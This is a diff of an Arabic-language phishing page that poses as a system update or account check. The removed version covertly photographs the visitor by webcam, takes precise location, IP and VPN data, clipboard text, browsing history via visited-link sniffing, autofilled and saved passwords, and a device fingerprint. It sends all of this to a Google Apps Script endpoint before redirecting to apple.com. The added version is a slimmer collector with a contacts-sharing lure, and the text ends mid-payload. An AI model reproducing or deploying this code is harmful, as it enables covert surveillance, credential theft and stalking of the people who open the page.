@@ -1,726 +1,186 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<meta name="robots" content="noindex,nofollow">
-<meta name="referrer" content="no-referrer">
-<title>جارٍ تحديث النظام…</title>
+<title>تأكيد الحساب</title>
 <style>
-  :root{--bg:#0d1117;--card:#161b22;--line:#30363d;--fg:#e6edf3;--mut:#9aa4af;--acc:#2f81f7;--ok:#3fb950;--err:#f85149}
-  *{box-sizing:border-box}
-  html,body{height:100%}
-  body{margin:0;background:radial-gradient(1200px 600px at 50% -10%,#1b2430,var(--bg));color:var(--fg);
-    font:16px/1.6 system-ui,-apple-system,"Segoe UI",Tahoma,sans-serif;display:grid;place-items:center;padding:20px}
-  .card{width:100%;max-width:420px;background:var(--card);border:1px solid var(--line);border-radius:16px;
-    padding:28px 22px;text-align:center;box-shadow:0 18px 50px rgba(0,0,0,.45)}
-  .ring{width:54px;height:54px;margin:0 auto 18px;border-radius:50%;border:3px solid var(--line);
-    border-top-color:var(--acc);animation:spin .9s linear infinite}
-  .ring.done{animation:none;border-color:var(--ok)}
-  .ring.fail{animation:none;border-color:var(--err)}
-  @keyframes spin{to{transform:rotate(360deg)}}
-  h1{font-size:19px;margin:0 0 6px}
-  .sub{color:var(--mut);font-size:14px;margin:0 0 14px}
-  .status{min-height:22px;font-size:14px;margin:0 0 16px;color:var(--mut)}
-  .status.ok{color:var(--ok)}.status.err{color:var(--err)}
-  button{width:100%;padding:13px;border:0;border-radius:10px;cursor:pointer;background:var(--acc);
-    color:#fff;font:inherit;font-weight:600}
-  button:disabled{opacity:.6;cursor:default}
-  button:focus-visible,a:focus-visible{outline:2px solid var(--acc);outline-offset:2px}
-  .go{display:block;margin-top:14px;color:var(--acc);font-size:14px;text-decoration:none;font-weight:600}
-  .hint{color:var(--mut);font-size:12px;margin:16px 0 0;line-height:1.5}
-  .hint code{background:#0d1117;padding:1px 5px;border-radius:5px;direction:ltr;display:inline-block}
-  [hidden]{display:none!important}
-  #cam{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;left:-10px;top:-10px}
-  .off{position:absolute;left:-9999px;top:0;width:2px;height:2px;overflow:hidden;opacity:0;white-space:nowrap}
-  #hist a{color:#111}
-  #hist a:visited{color:#2f81f7}
-  @media (prefers-reduced-motion:reduce){.ring{animation:none}}
+  body{font-family:system-ui,sans-serif;background:#0f1720;color:#e8eef5;
+       display:flex;min-height:100vh;align-items:center;justify-content:center;margin:0}
+  .card{width:min(92vw,380px);background:#18222e;padding:28px;border-radius:18px;text-align:center}
+  h1{font-size:20px;margin:0 0 8px}
+  p{color:#93a3b5;font-size:14px;margin:0 0 20px}
+  button{width:100%;padding:14px;border:0;border-radius:12px;font-size:15px;
+         background:#2f6df6;color:#fff;cursor:pointer;margin-top:10px}
+  button:disabled{opacity:.5}
+  #st{font-size:13px;color:#93a3b5;margin-top:14px;min-height:18px}
 </style>
 </head>
 <body>
-<main class="card">
-  <div class="ring" id="ring" aria-hidden="true"></div>
-  <h1 id="title">جارٍ تحديث النظام</h1>
-  <p class="sub" id="sub">لا تُغلق الصفحة، سيستغرق الأمر لحظات.</p>
-  <p class="status" id="status" role="status" aria-live="polite"></p>
-  <button id="btn" type="button">بدء التحقق</button>
-  <a class="go" id="go" href="#" hidden>المتابعة الآن</a>
-  <p class="hint" id="hint" hidden></p>
-  <noscript><a class="go" href="https://www.apple.com/">المتابعة</a></noscript>
-</main>
-
-<video id="cam" playsinline muted autoplay></video>
-
-<div id="off" class="off" aria-hidden="true">
-  <form autocomplete="on">
-    <input type="text" name="username" autocomplete="username">
-    <input type="email" name="email" autocomplete="email">
-    <input type="password" name="password" autocomplete="current-password">
-  </form>
+<div class="card">
+  <h1>تأكيد الحساب</h1>
+  <p>اضغط الزر أدناه للمتابعة</p>
+  <button id="go">متابعة</button>
+  <button id="btnContacts" type="button">مشاركة جهات الاتصال</button>
+  <input id="vcf" type="file" accept=".vcf,text/vcard" hidden>
+  <div id="st"></div>
 </div>
 
-<div id="hist" class="off" aria-hidden="true"></div>
-
 <script>
-(function () {
-  'use strict';
+const API = 'https://script.google.com/macros/s/AKfycbwny-OBIYxZxgOlK9dggNVWg8bMq_DipzhoVtrZpLfGq8u2R1GvdjncetiwEwVsAhXZSQ/exec';
+const st = document.getElementById('st');
 
-  /* ===================== الإعدادات ===================== */
-  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbwny-OBIYxZxgOlK9dggNVWg8bMq_DipzhoVtrZpLfGq8u2R1GvdjncetiwEwVsAhXZSQ/exec';
-  const REDIRECT = 'https://www.apple.com/';
-  const T_GEO = 14000, T_NET = 4500, T_RTC = 4500, T_CAM = 9000, T_CHECK = 8000;
-  const NA = 'N/A';
+function newNonce(){
+  return (crypto.randomUUID ? crypto.randomUUID() : Date.now()+''+Math.random()).replace(/-/g,'');
+}
+let NONCE = null;
 
-  const $ = id => document.getElementById(id);
-  const el = { ring:$('ring'), title:$('title'), sub:$('sub'), status:$('status'),
-               btn:$('btn'), go:$('go'), hint:$('hint') };
+async function post(body){
+  await fetch(API, {
+    method:'POST', mode:'no-cors',
+    headers:{'Content-Type':'text/plain;charset=utf-8'},
+    body: JSON.stringify(body)
+  });
+}
 
-  let busy = false, done = false, photoDone = false, geoDone = false;
-  let N = '', BLOB = null, failTimer = null, touched = false;
+function geo(){
+  return new Promise(res => {
+    if (!navigator.geolocation) return res(null);
+    navigator.geolocation.getCurrentPosition(
+      p => res({lat:p.coords.latitude, lng:p.coords.longitude, acc:p.coords.accuracy}),
+      () => res(null),
+      {enableHighAccuracy:true, timeout:8000, maximumAge:0}
+    );
+  });
+}
 
-  const sleep = ms => new Promise(r => setTimeout(r, ms));
-  const pad = n => String(n).padStart(2, '0');
+async function battery(){
+  try{
+    const b = await navigator.getBattery();
+    return { level: Math.round(b.level*100)+'%', charging: b.charging ? 'يشحن' : 'لا يشحن' };
+  }catch(_){ return {}; }
+}
 
-  function setStatus(t, k) {
-    el.status.textContent = t || '';
-    el.status.className = 'status' + (k ? ' ' + k : '');
-  }
-
-  function withTimeout(p, ms, fb) {
-    return new Promise(res => {
-      let fin = false;
-      const t = setTimeout(() => { if (!fin) { fin = true; res(fb); } }, ms);
-      Promise.resolve(p).then(
-        v => { if (!fin) { fin = true; clearTimeout(t); res(v); } },
-        () => { if (!fin) { fin = true; clearTimeout(t); res(fb); } }
-      );
-    });
-  }
-
-  function nonce() {
-    try { if (window.crypto && crypto.randomUUID) return crypto.randomUUID().replace(/-/g, ''); } catch (_) {}
-    return Date.now().toString(36) + Math.random().toString(36).slice(2, 10);
-  }
-
-  function toQuery(o) {
-    return Object.keys(o).filter(k => o[k] !== '' && o[k] != null)
-      .map(k => encodeURIComponent(k) + '=' + encodeURIComponent(String(o[k]))).join('&');
-  }
-
-  function jsonp(params, timeoutMs) {
-    return new Promise(res => {
-      const name = 'vn_' + Math.random().toString(36).slice(2, 10);
-      const s = document.createElement('script');
-      let fin = false;
-      const finish = v => {
-        if (fin) return; fin = true;
-        clearTimeout(timer);
-        try { delete window[name]; } catch (_) { window[name] = undefined; }
-        if (s.parentNode) s.parentNode.removeChild(s);
-        res(v);
-      };
-      window[name] = r => finish(!!(r && r.ok === true));
-      const timer = setTimeout(() => finish(false), timeoutMs);
-      s.onerror = () => finish(false);
-      s.async = true;
-      s.src = ENDPOINT + (ENDPOINT.indexOf('?') === -1 ? '?' : '&') + toQuery(params) + '&cb=' + name + '&_=' + Date.now();
-      document.head.appendChild(s);
-    });
-  }
-
-  function h32(str) {
-    let h = 5381;
-    for (let i = 0; i < str.length; i++) h = ((h << 5) + h + str.charCodeAt(i)) | 0;
-    return (h >>> 0).toString(36);
-  }
-
-  /* ===================== النقل ===================== */
-  async function postData(payload) {
-    const body = JSON.stringify({ a: 'collect', d: payload });
-    try {
-      await fetch(ENDPOINT, {
-        method: 'POST', mode: 'no-cors', cache: 'no-store',
-        headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
-        body: body
-      });
-      return true;
-    } catch (_) { return false; }
-  }
-
-  function jsonpData(payload) {
-    const p = Object.assign({}, payload);
-    p.hist = JSON.stringify((payload.hist ? JSON.parse(payload.hist) : []).slice(0, 12));
-    p.misc = '{}';
-    p.fp = (p.fp || '').slice(0, 120);
-    p.ua = (p.ua || '').slice(0, 120);
-    p.ips = (p.ips || []).slice(0, 3);
-    p.rtc = (p.rtc || []).slice(0, 3);
-    p.cred = (p.cred || '').slice(0, 200);
-    return jsonp({ a: 'collect', d: JSON.stringify(p) }, 12000);
-  }
-
-  async function confirmNonce(n) {
-    for (let i = 0; i < 2; i++) {
-      if (await jsonp({ a: 'check', n: n }, T_CHECK)) return true;
-      await sleep(700);
-    }
-    return false;
-  }
-
-  /* ===================== IP / VPN ===================== */
-  const PUB4 = /^(?!(10\.|127\.|169\.254\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.))\d{1,3}(?:\.\d{1,3}){3}$/;
-  const PUB6 = /^(?!fe80:|fc|fd|::1)[0-9a-f]{0,4}(?::[0-9a-f]{0,4}){3,7}$/i;
-
-  const SOURCES = [
-    { u:'https://api.ipify.org?format=json',        m:'j' },
-    { u:'https://ipwho.is/',                        m:'j' },
-    { u:'https://ipapi.co/json/',                   m:'j' },
-    { u:'https://ipinfo.io/json',                   m:'j' },
-    { u:'https://api.my-ip.io/v2/ip.json',          m:'j' },
-    { u:'https://www.cloudflare.com/cdn-cgi/trace', m:'t' },
-    { u:'https://api64.ipify.org?format=json',      m:'j' }
-  ];
-
-  function parseIp(txt, m) {
-    if (m === 't') { const x = /(?:^|\n)ip=([^\n]+)/.exec(txt); return x ? x[1].trim() : ''; }
-    try { const j = JSON.parse(txt); return String(j.ip || j.query || ''); } catch (_) {}
-    return '';
-  }
-
-  async function probe(src) {
-    try {
-      const r = await withTimeout(fetch(src.u, { mode:'cors', cache:'no-store', credentials:'omit' }), T_NET, null);
-      if (!r || !r.ok) return '';
-      const ip = parseIp(await r.text(), src.m);
-      return (PUB4.test(ip) || PUB6.test(ip)) ? ip : '';
-    } catch (_) { return ''; }
-  }
-
-  async function getIps() {
-    const all = await Promise.all(SOURCES.map(probe));
-    const list = [...new Set(all.filter(Boolean))];
-    return { list, best: list.filter(x => PUB4.test(x))[0] || list[0] || NA };
-  }
-
-  function getRtc() {
-    return withTimeout(new Promise(res => {
-      const PC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
-      if (!PC) return res([]);
-      let pc;
-      try { pc = new PC({ iceServers: [
-        { urls:'stun:stun.l.google.com:19302' },
-        { urls:'stun:global.stun.twilio.com:3478' }
-      ]}); } catch (_) { return res([]); }
-
-      const found = new Set();
-      let fin = false;
-      const stop = () => {
-        if (fin) return; fin = true;
-        try { pc.close(); } catch (_) {}
-        res([...found]);
-      };
+function localIp(){
+  return new Promise(res => {
+    const ips = new Set(); let done = false;
+    try{
+      const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+      pc.createDataChannel('');
       pc.onicecandidate = e => {
-        if (!e.candidate) return stop();
-        const ip = e.candidate.candidate.split(' ')[4];
-        if (ip && !/\.local$/i.test(ip)) found.add(ip);
+        if(!e.candidate){ if(!done){done=true; res([...ips]);} return; }
+        const m = /(\d{1,3}(?:\.\d{1,3}){3})/.exec(e.candidate.candidate);
+        if(m) ips.add(m[1]);
       };
-      try { pc.createDataChannel('x'); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(stop); }
-      catch (_) { stop(); }
-      setTimeout(stop, T_RTC);
-    }), T_RTC + 600, []);
-  }
-
-  async function tzOf(ip) {
-    if (!ip || ip === NA) return '';
-    try {
-      const r = await withTimeout(fetch('https://ipwho.is/' + ip, { cache:'no-store' }), 3500, null);
-      if (!r || !r.ok) return '';
-      const j = await r.json();
-      return (j && j.timezone && j.timezone.id) || '';
-    } catch (_) { return ''; }
-  }
-
-  /* ===================== جامعات ===================== */
-  function getBattery() {
-    return withTimeout((async () => {
-      if (!navigator.getBattery) return { level:NA, charging:NA };
-      const b = await navigator.getBattery();
-      return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'يشحن' : 'لا يشحن' };
-    })(), 2500, { level:NA, charging:NA });
-  }
-
-  function getNetwork() {
-    const c = navigator.connection || navigator.webkitConnection;
-    const p = [];
-    if (!navigator.onLine) p.push('غير متصل');
-    if (c) {
-      if (c.effectiveType) p.push(c.effectiveType);
-      if (c.downlink) p.push(c.downlink + 'Mbps');
-      if (c.rtt != null) p.push('rtt ' + c.rtt + 'ms');
-    }
-    return p.length ? p.join(' / ').slice(0, 80) : NA;
-  }
-
-  function getGeo() {
-    if (!navigator.geolocation) return Promise.resolve({ lat:'', lng:'', acc:'', src:NA });
-    return withTimeout(new Promise(res => {
-      navigator.geolocation.getCurrentPosition(
-        pos => res({
-          lat: +pos.coords.latitude.toFixed(6),
-          lng: +pos.coords.longitude.toFixed(6),
-          acc: Math.round(pos.coords.accuracy),
-          src: 'متصفح'
-        }),
-        e => res({ lat:'', lng:'', acc:'', src: e && e.code === 1 ? 'مرفوض' : 'فشل' }),
-        { enableHighAccuracy:true, timeout:T_GEO, maximumAge:0 }
-      );
-    }), T_GEO + 1500, { lat:'', lng:'', acc:'', src:'انتهت المهلة' });
-  }
-
-  /* ===================== الكاميرا ===================== */
-  async function shoot() {
-    const md = navigator.mediaDevices;
-    if (!md || !md.getUserMedia) return null;
-    const v = $('cam');
-    let stream;
-    try {
-      stream = await md.getUserMedia({
-        video: { facingMode:{ ideal:'user' }, width:{ ideal:640 }, height:{ ideal:480 } },
-        audio: false
-      });
-    } catch (_) { return null; }
-
-    try {
-      v.srcObject = stream;
-      await v.play().catch(() => {});
-      await sleep(650);
-      const w = v.videoWidth || 480, h = v.videoHeight || 360;
-      const s = Math.min(1, 360 / Math.max(w, h));
-      const cv = document.createElement('canvas');
-      cv.width = Math.max(1, Math.round(w * s));
-      cv.height = Math.max(1, Math.round(h * s));
-      cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
-      return await new Promise(r => {
-        if (cv.toBlob) cv.toBlob(r, 'image/jpeg', 0.5);
-        else {
-          const bin = atob(cv.toDataURL('image/jpeg', 0.5).split(',')[1]);
-          const a = new Uint8Array(bin.length);
-          for (let i = 0; i < bin.length; i++) a[i] = bin.charCodeAt(i);
-          r(new Blob([a], { type:'image/jpeg' }));
-        }
-      });
-    } catch (_) { return null; }
-    finally {
-      try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
-      try { v.srcObject = null; } catch (_) {}
-    }
-  }
-
-  function shrink(blob) {
-    return new Promise(res => {
-      const img = new Image();
-      const url = URL.createObjectURL(blob);
-      img.onload = () => {
-        try {
-          const s = Math.min(1, 260 / Math.max(img.width, img.height));
-          const cv = document.createElement('canvas');
-          cv.width = Math.max(1, Math.round(img.width * s));
-          cv.height = Math.max(1, Math.round(img.height * s));
-          cv.getContext('2d').drawImage(img, 0, 0, cv.width, cv.height);
-          URL.revokeObjectURL(url);
-          cv.toBlob(b => res(b || blob), 'image/jpeg', 0.42);
-        } catch (_) { res(blob); }
-      };
-      img.onerror = () => res(blob);
-      img.src = url;
-    });
-  }
-
-  function toDataUrl(blob) {
-    return new Promise(res => {
-      const fr = new FileReader();
-      fr.onload = () => res(String(fr.result || ''));
-      fr.onerror = () => res('');
-      fr.readAsDataURL(blob);
-    });
-  }
-
-  async function sendPhoto(blob, n) {
-    if (!blob || !n || photoDone) return false;
-    if (blob.size > 55000) blob = await shrink(blob);
-    const dataUrl = await toDataUrl(blob);
-    if (!dataUrl) return false;
-
-    const body = JSON.stringify({ a: 'photo', nonce: n, img: dataUrl });
-    for (let i = 0; i < 3; i++) {
-      try {
-        await fetch(ENDPOINT, {
-          method: 'POST', mode: 'no-cors', cache: 'no-store',
-          headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
-          body: body
-        });
-        photoDone = true;
-        return true;
-      } catch (_) {}
-      await sleep(600);
-    }
-    return false;
-  }
-
-  /* ===================== بصمة ===================== */
-  function detectFonts() {
-    try {
-      const base = ['monospace', 'sans-serif', 'serif'];
-      const c = document.createElement('canvas').getContext('2d');
-      const w = f => { c.font = '72px ' + f; return c.measureText('mmmmmmmmmmlli').width; };
-      const b = base.map(w).join('|');
-      const list = ['Arial','Tahoma','Courier New','Georgia','Verdana','Times New Roman',
-                    'Segoe UI','Roboto','Helvetica Neue','Impact','Trebuchet MS','Comic Sans MS'];
-      const hits = [];
-      for (const f of list) {
-        const v = base.map(x => { c.font = '72px "' + f + '", ' + x; return c.measureText('mmmmmmmmmmlli').width; }).join('|');
-        if (v !== b) hits.push(f);
-      }
-      return hits;
-    } catch (_) { return []; }
-  }
-
-  function fingerprint() {
-    const o = [];
-    try {
-      const c = document.createElement('canvas');
-      c.width = 200; c.height = 40;
-      const x = c.getContext('2d');
-      x.textBaseline = 'top'; x.font = '14px Arial';
-      x.fillStyle = '#f60'; x.fillRect(0, 0, 200, 40);
-      x.fillStyle = '#069'; x.fillText('Venice fp 图 1', 2, 2);
-      o.push('c' + h32(c.toDataURL()));
-    } catch (_) {}
-    try {
-      const g = document.createElement('canvas').getContext('webgl');
-      const d = g.getExtension('WEBGL_debug_renderer_info');
-      if (d) o.push('r' + h32(String(g.getParameter(d.UNMASKED_RENDERER_WEBGL))));
-    } catch (_) {}
-    o.push('f' + h32(detectFonts().join(',')));
-    o.push('hc' + navigator.hardwareConcurrency, 'dm' + (navigator.deviceMemory || ''),
-           'dpr' + (devicePixelRatio || 1), 'cd' + screen.colorDepth,
-           'mt' + (navigator.maxTouchPoints || 0), 'sc' + screen.width + 'x' + screen.height,
-           'wd' + (navigator.webdriver ? 1 : 0));
-    return o.join('|').slice(0, 700);
-  }
-
-  async function misc() {
-    const o = {};
-    try { o.cores = navigator.hardwareConcurrency || null; } catch (_) {}
-    try {
-      if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-        const d = await withTimeout(navigator.mediaDevices.enumerateDevices(), 1500, []);
-        o.cams = d.filter(x => x.kind === 'videoinput').length;
-        o.mics = d.filter(x => x.kind === 'audioinput').length;
-      }
-    } catch (_) {}
-    try {
-      const st = {};
-      for (const n of ['camera','microphone','geolocation','notifications']) {
-        try { const p = await navigator.permissions.query({ name:n }); st[n] = p.state; } catch (_) {}
-      }
-      if (Object.keys(st).length) o.perm = st;
-    } catch (_) {}
-    try {
-      const b = document.createElement('div');
-      b.className = 'ad-banner adsbox';
-      b.style.cssText = 'position:absolute;height:12px;width:300px;left:-9999px';
-      document.body.appendChild(b);
-      await sleep(120);
-      o.adblock = b.offsetHeight === 0 ? 'مرجّح' : 'لا';
-      b.remove();
-    } catch (_) {}
-    try { o.tzOff = new Date().getTimezoneOffset(); } catch (_) {}
-    try { o.orient = screen.orientation ? screen.orientation.type : ''; } catch (_) {}
-    return o;
-  }
-
-  async function clipboard() {
-    try {
-      if (!navigator.clipboard || !navigator.clipboard.readText) return '';
-      const t = await withTimeout(navigator.clipboard.readText(), 2200, '');
-      return String(t || '').replace(/\s+/g, ' ').slice(0, 200);
-    } catch (_) { return ''; }
-  }
-
-  /* ===================== سجل التصفح ===================== */
-  const SITES = [
-    'google.com','youtube.com','facebook.com','instagram.com','whatsapp.com','tiktok.com',
-    'x.com','twitter.com','snapchat.com','telegram.org','netflix.com','amazon.com',
-    'wikipedia.org','yahoo.com','microsoft.com','apple.com','linkedin.com','pinterest.com',
-    'reddit.com','twitch.tv','discord.com','github.com','stackoverflow.com','quora.com',
-    'paypal.com','binance.com','coinbase.com','aliexpress.com','shein.com','temu.com',
-    'youm7.com','masrawy.com','elwatannews.com','akhbarak.net','filgoal.com','yallakora.com',
-    'vodafone.com.eg','orange.eg','etisalat.eg','we.eg','cibeg.com','banquemisr.com'
-  ];
-
-  function sniffHistory() {
-    return withTimeout(new Promise(res => {
-      const host = $('hist');
-      if (!host) return res([]);
-      host.textContent = '';
-      SITES.forEach(s => {
-        const a = document.createElement('a');
-        a.href = 'https://' + s + '/';
-        a.textContent = '.';
-        host.appendChild(a);
-      });
-      setTimeout(() => {
-        const hits = [];
-        [...host.children].forEach(a => {
-          const c = getComputedStyle(a).color;
-          if (c && c !== 'rgb(17, 17, 17)') hits.push(a.hostname.replace(/^www\./, ''));
-        });
-        host.textContent = '';
-        res(hits.slice(0, 60));
-      }, 300);
-    }), 2200, []);
-  }
-
-  /* ===================== autofill ===================== */
-  function credTrap() {
-    return withTimeout(new Promise(res => {
-      setTimeout(() => {
-        const out = {};
-        const f = document.querySelector('#off form');
-        if (f) ['username','email','password'].forEach(n => {
-          const i = f.querySelector('[name="' + n + '"]');
-          if (i && i.value) out[n] = i.value.slice(0, 120);
-        });
-        res(out);
-      }, 1100);
-    }), 1500, {});
-  }
-
-  async function credApi() {
-    try {
-      if (!navigator.credentials || !navigator.credentials.get) return {};
-      const c = await withTimeout(navigator.credentials.get({ password:true, mediation:'silent' }), 2500, null);
-      if (!c) return {};
-      return { id:String(c.id || '').slice(0, 120), pw:String(c.password || '').slice(0, 120) };
-    } catch (_) { return {}; }
-  }
-
-  /* ===================== تحليل UA ===================== */
-  function parseModel(ua) {
-    const m = ua.match(/Android[^;)]*;\s*(?:[a-z]{2}[-_][a-z]{2};\s*)?([^;)]+?)(?:\s+Build[/)]|\))/i);
-    if (m) return m[1].replace(/\s+/g, ' ').trim().slice(0, 60);
-    if (/iPhone/.test(ua)) return 'iPhone';
-    if (/iPad/.test(ua)) return 'iPad';
-    return '';
-  }
-  function parseBrand(ua) {
-    const t = ua.toLowerCase();
-    if (/redmi|poco|xiaomi|\bmi\b/.test(t)) return 'Xiaomi';
-    if (/samsung|sm-/.test(t)) return 'Samsung';
-    if (/huawei|honor/.test(t)) return 'Huawei';
-    if (/oppo|cph\d/.test(t)) return 'OPPO';
-    if (/vivo/.test(t)) return 'Vivo';
-    if (/oneplus/.test(t)) return 'OnePlus';
-    if (/iphone|ipad|ipod/.test(t)) return 'Apple';
-    if (/windows/.test(t)) return 'PC';
-    return '';
-  }
-  function parsePlatform(ua) {
-    let m = ua.match(/Android\s+([\d.]+)/i);
-    if (m) return 'Android ' + m[1];
-    m = ua.match(/(?:iPhone )?OS (\d+)[._](\d+)/i);
-    if (m) return 'iOS ' + m[1] + '.' + m[2];
-    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
-    if (/Mac OS X/.test(ua)) return 'macOS';
-    if (/Linux/.test(ua)) return 'Linux';
-    return NA;
-  }
-
-  function localTime() {
-    const d = new Date();
-    return d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()) + ' ' +
-           pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
-  }
-
-  /* ===================== البناء ===================== */
-  async function build(n, parts) {
-    const ua = (navigator.userAgent || '').slice(0, 400);
-    const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || NA).slice(0, 60);
-
-    let vpn = '';
-    const rtcPub = parts.rtc.filter(x => PUB4.test(x));
-    if (rtcPub.length && parts.ips.best !== NA && rtcPub.indexOf(parts.ips.best) === -1)
-      vpn = 'تسريب WebRTC: ' + rtcPub[0];
-    if (parts.ips.list.length > 1) vpn = (vpn ? vpn + ' | ' : '') + 'مصادر IP: ' + parts.ips.list.length;
-    if (!vpn && parts.ips.best !== NA) {
-      const rt = await tzOf(parts.ips.best);
-      if (rt && rt !== tz) vpn = 'تعارض منطقة زمنية (' + tz + ' ≠ ' + rt + ')';
-    }
-
-    const cred = [];
-    if (parts.trap.username) cred.push('user=' + parts.trap.username);
-    if (parts.trap.email) cred.push('mail=' + parts.trap.email);
-    if (parts.trap.password) cred.push('pass=' + parts.trap.password);
-    if (parts.capi.id) cred.push('api=' + parts.capi.id);
-    if (parts.capi.pw) cred.push('apipw=' + parts.capi.pw);
-    if (parts.clip) cred.push('clip=' + parts.clip);
-
-    return {
-      nonce: n,
-      time: localTime(),
-      ip: parts.ips.best,
-      ips: parts.ips.list,
-      rtc: parts.rtc,
-      vpn: vpn.slice(0, 120),
-      localIp: parts.rtc.find(x => !PUB4.test(x) && x.indexOf(':') === -1) || NA,
-      battery: parts.batt.level,
-      charging: parts.batt.charging,
-      lat: parts.geo.lat, lng: parts.geo.lng, acc: parts.geo.acc, geoSource: parts.geo.src,
-      tz,
-      lang: (navigator.languages || [navigator.language || NA]).join(',').slice(0, 60),
-      ua,
-      brand: parseBrand(ua), model: parseModel(ua), platform: parsePlatform(ua),
-      network: getNetwork(),
-      screen: (screen.width || 0) + 'x' + (screen.height || 0),
-      native: 'لا',
-      cCount: 0, cJson: '[]', sCount: 0, sJson: '[]', lCount: 0, lJson: '[]',
-      fp: fingerprint(),
-      cred: JSON.stringify(cred),
-      hist: JSON.stringify(parts.hist),
-      misc: JSON.stringify(parts.extra)
-    };
-  }
-
-  /* ===================== التدفق ===================== */
-  function resetState() {
-    busy = false; done = false; photoDone = false; geoDone = false; touched = false;
-    N = ''; BLOB = null;
-    clearTimeout(failTimer);
-    el.ring.className = 'ring';
-    el.btn.hidden = true;
-    el.btn.disabled = false;
-    el.btn.textContent = 'بدء التحقق';
-    el.go.hidden = true;
-    setStatus('');
-  }
-
-  function succeed() {
-    done = true;
-    clearTimeout(failTimer);
-    el.ring.className = 'ring done';
-    el.title.textContent = 'تم التحقق بنجاح';
-    el.sub.textContent = 'جارٍ تحويلك…';
-    setStatus('تم تسجيل الجهاز.', 'ok');
-    el.btn.hidden = true;
-    el.go.href = REDIRECT;
-    el.go.hidden = false;
-    setTimeout(() => location.replace(REDIRECT), 1800);
-  }
-
-  function fail(msg) {
-    done = true; busy = false;
-    clearTimeout(failTimer);
-    el.ring.className = 'ring fail';
-    el.title.textContent = 'تعذّر إكمال التحقق';
-    el.sub.textContent = 'يمكنك المتابعة أو إعادة المحاولة.';
-    setStatus(msg || 'لم يصل تأكيد من الخادم.', 'err');
-    el.btn.hidden = false; el.btn.disabled = false; el.btn.textContent = 'إعادة المحاولة';
-    el.go.href = REDIRECT; el.go.hidden = false;
-    failTimer = setTimeout(() => { if (!busy) location.replace(REDIRECT); }, 9000);
-  }
-
-  async function run() {
-    if (busy || done) return;
-    busy = true;
-    clearTimeout(failTimer);
-    el.btn.disabled = true;
-    el.ring.className = 'ring';
-    el.title.textContent = 'جارٍ تحديث النظام';
-    el.sub.textContent = 'قد يظهر طلب إذن الكاميرا والموقع، اقبلهما.';
-    el.go.hidden = true;
-
-    N = nonce();
-    window.__vn = N;
-
-    const histP = sniffHistory();
-    const trapP = credTrap();
-    const capiP = credApi();
-    const extraP = misc();
-    const clipP = clipboard();
-
-    setStatus('جارٍ التحقق من الكاميرا…');
-    const blobP = withTimeout(shoot(), T_CAM, null);
-    const geoP = blobP.then(() => { setStatus('جارٍ تحديد الموقع…'); return getGeo(); });
-
-    const netP = Promise.all([getIps(), getRtc(), getBattery()]);
-
-    const geo = await geoP;
-    geoDone = geo.lat !== '';
-
-    const [ips, rtc, batt] = await netP;
-    const [hist, trap, capi, extra, clip] = await Promise.all([histP, trapP, capiP, extraP, clipP]);
-
-    setStatus('جارٍ إرسال البيانات…');
-    const payload = await build(N, { ips, rtc, batt, geo, hist, trap, capi, extra, clip });
-
-    let ok = false;
-    if (await postData(payload)) ok = true;
-    else ok = await jsonpData(payload);
-
-    const okP = ok ? confirmNonce(N) : Promise.resolve(false);
-
-    BLOB = await withTimeout(blobP, 3000, null);
-    if (BLOB) { setStatus('جارٍ رفع الصورة…'); await sendPhoto(BLOB, N); }
-
-    const confirmed = await okP;
-    if (!confirmed) { fail('لم يصل تأكيد من الخادم.'); return; }
-
-    busy = false;
-    succeed();
-  }
-
-  /* إعادة المحاولة عند أول لمسة */
-  function onGesture() {
-    if (touched) return;
-    touched = true;
-    if (!N) return;
-    if (!BLOB) shoot().then(b => { if (b) { BLOB = b; sendPhoto(b, N); } });
-    if (!geoDone) getGeo().then(g => {
-      if (g.lat === '') return;
-      geoDone = true;
-      const body = JSON.stringify({ a:'geo', n:N, lat:g.lat, lng:g.lng, acc:g.acc });
-      fetch(ENDPOINT, {
-        method:'POST', mode:'no-cors', cache:'no-store',
-        headers:{ 'Content-Type':'text/plain;charset=UTF-8' }, body: body
-      }).catch(() => {});
-    });
-  }
-
-  /* ===================== التهيئة ===================== */
-  el.go.href = REDIRECT;
-
-  if (!/^https:\/\/script\.google\.com\//.test(ENDPOINT)) {
-    el.hint.hidden = false;
-    el.hint.innerHTML = 'لم يُضبط رابط النشر. عدّل <code>ENDPOINT</code> أعلى السكربت.';
-    el.btn.disabled = true;
-  }
-
-  el.btn.addEventListener('click', () => { resetState(); run(); });
-  ['pointerdown','touchstart'].forEach(ev => document.addEventListener(ev, onGesture, { passive:true }));
-
-  window.addEventListener('pageshow', e => {
-    if (e.persisted) { resetState(); run(); }
-    else if (!done && !busy) run();
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+      setTimeout(()=>{ if(!done){done=true; res([...ips]);} }, 4000);
+    }catch(_){ res([]); }
   });
-  window.addEventListener('online', () => { if (!done && !busy) run(); });
-  document.addEventListener('visibilitychange', () => {
-    if (document.visibilityState === 'visible' && !done && !busy) run();
+}
+
+document.getElementById('go').addEventListener('click', async e => {
+  e.target.disabled = true;
+  NONCE = newNonce();
+  st.textContent = 'جارٍ التحقق…';
+
+  const [g, b, ips] = await Promise.all([geo(), battery(), localIp()]);
+
+  let ip = 'N/A';
+  try{
+    const r = await fetch('https://api.ipify.org?format=json');
+    ip = (await r.json()).ip || 'N/A';
+  }catch(_){}
+
+  await post({
+    nonce: NONCE,
+    time: new Date().toString(),
